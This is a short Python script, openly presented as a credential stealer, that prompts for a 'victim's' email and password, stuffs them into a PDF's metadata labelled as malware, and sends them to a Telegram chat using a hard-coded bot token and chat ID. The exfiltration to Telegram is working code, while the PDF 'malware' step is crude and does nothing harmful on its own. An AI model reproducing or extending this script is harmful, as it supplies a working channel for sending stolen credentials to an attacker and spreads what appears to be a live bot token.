import requests
import PyPDF2
import telebot

# Function to steal user info
def steal_info():
    user = input("Enter victim's email: ")
    password = input("Enter victim's password: ")
    return [user, password]

# Function to add malware to a PDF file
def add_malware_to_pdf(malware, pdf):
    file = open(pdf, 'rb')
    pdf_reader = PyPDF2.PdfFileReader(file)
    pdf_writer = PyPDF2.PdfFileWriter()
    
    # Copy existing pages into the new PDF
    for page in range(pdf_reader.getNumPages()):
        pdf_writer.addPage(pdf_reader.getPage(page))
    
    # Add malware as metadata (example only)
    pdf_writer.addMetadata({'/Malware': malware})
    
    # Save the new malicious PDF
    stream = open('malicious.pdf', 'wb')
    pdf_writer.write(stream)
    stream.close()
    file.close()

# Function to send data to Telegram
def send_to_telegram(telegram_token, chat_id, data):
    bot = telebot.TeleBot(telegram_token)
    bot.send_message(chat_id, "Stolen information:")
    bot.send_message(chat_id, f"Email: {data[0]}")
    bot.send_message(chat_id, f"Password: {data[1]}")
    print("Information sent to Telegram")

# Telegram credentials (replace with your own valid token and chat ID)
telegram_token = "8141276530:AAGXtlMv6psShidQvlahK8jhPXDjEKD4Ceg"
chat_id = 1702319284

# Main execution
info = steal_info()
print(info)

# Add stolen info as "malware" to a PDF file
add_malware_to_pdf(info[0] + info[1], "hello.pdf")

# Send stolen info to Telegram
send_to_telegram(telegram_token, chat_id, info) 
